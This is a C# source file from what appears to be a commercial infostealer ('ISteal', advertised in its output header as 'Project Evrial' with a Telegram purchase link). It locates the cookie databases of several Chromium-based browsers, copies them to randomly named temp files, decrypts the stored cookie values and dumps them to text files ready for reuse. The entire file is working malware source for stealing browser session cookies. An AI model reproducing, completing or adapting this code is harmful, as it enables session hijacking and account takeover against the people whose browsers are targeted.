using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using ISteal.Password;

namespace ISteal.Cookies
{
    class ChromiumCookie
    {
        public static void ChromiumInitialise(string path)
        {
            string[] array = new string[]
            {
                Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), "\\Google\\Chrome\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Opera Software\\Opera Stable\\Cookies"),
                Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), "\\Kometa\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), "\\Orbitum\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), "\\Comodo\\Dragon\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), "\\Amigo\\User\\User Data\\Default\\Cookies"),
                Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), "\\Torch\\User Data\\Default\\Cookies")
            };
            string[] array2 = array;
            for (int i = 0; i < array2.Length; i++)
            {
                string text = array2[i];
                try
                {
                    string str = "";
                    if (text.Contains("Chrome"))
                    {
                        str = "Google";
                    }
                    if (text.Contains("Yandex"))
                    {
                        str = "Yandex";
                    }
                    if (text.Contains("Orbitum"))
                    {
                        str = "Orbitum";
                    }
                    if (text.Contains("Opera"))
                    {
                        str = "Opera";
                    }
                    if (text.Contains("Amigo"))
                    {
                        str = "Amigo";
                    }
                    if (text.Contains("Torch"))
                    {
                        str = "Torch";
                    }
                    if (text.Contains("Comodo"))
                    {
                        str = "Comodo";
                    }
                    try
                    {
                        List<Cookie> cookies = GetCookies(text);
                        if (cookies != null)
                        {
                            Directory.CreateDirectory(path + "\\Cookies\\");
                            using (StreamWriter streamWriter = new StreamWriter(path + "\\Cookies\\" + str + "_cookies.txt"))
                            {
                                streamWriter.WriteLine("# ----------------------------------");
                                streamWriter.WriteLine("# Stealed cookies by Project Evrial ");
                                streamWriter.WriteLine("# Developed by Qutra ");
                                streamWriter.WriteLine("# Buy Project Evrial: t.me/Qutrachka");
                                streamWriter.WriteLine("# ----------------------------------\r\n");
                                foreach (Cookie current in cookies)
                                {
                                    if (current.ExpirationDate == "9223372036854775807")
                                    {
                                        current.ExpirationDate = "0";
                                    }
                                    if (current.Domain[0] != '.')
                                    {
                                        current.HostOnly = "FALSE";
                                    }
                                    streamWriter.Write(string.Concat(new string[]
                                    {
                                        current.Domain,
                                        "\t",
                                        current.HostOnly,
                                        "\t",
                                        current.Path,
                                        "\t",
                                        current.Secure,
                                        "\t",
                                        current.ExpirationDate,
                                        "\t",
                                        current.Name,
                                        "\t",
                                        current.Value,
                                        "\r\n"
                                    }));
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        private static List<Cookie> GetCookies(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }

            List<Cookie> result;
            try
            {
                string text = $"{Path.GetTempPath()}/{Helper.GetRandomString()}.fv";
                if (File.Exists(text))
                {
                    File.Delete(text);
                }
                File.Copy(basePath, text, true);
                Sqlite sqlite = new Sqlite(text);
                sqlite.ReadTable("cookies");
                List<Cookie> list = new List<Cookie>();
                for (var i = 0; i < sqlite.GetRowCount(); i++)
                {
                    try
                    {
                        string value = string.Empty;
                        try
                        {
                            value = Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null));
                        }
                        catch (Exception) { }
                        bool.TryParse(sqlite.GetValue(i, 6), out var flag);
                        list.Add(new Cookie
                        {
                            Domain = sqlite.GetValue(i, 1),
                            Name = sqlite.GetValue(i, 2),
                            Path = sqlite.GetValue(i, 4),
                            ExpirationDate = sqlite.GetValue(i, 5),
                            Secure = flag.ToString().ToUpper(),
                            Value = value,
                            HostOnly = "TRUE"
                        });
                    }
                    catch (Exception) { }
                }
                result = list;
            }
            catch
            {
                result = new List<Cookie>();
            }
            return result;
        }
    }
}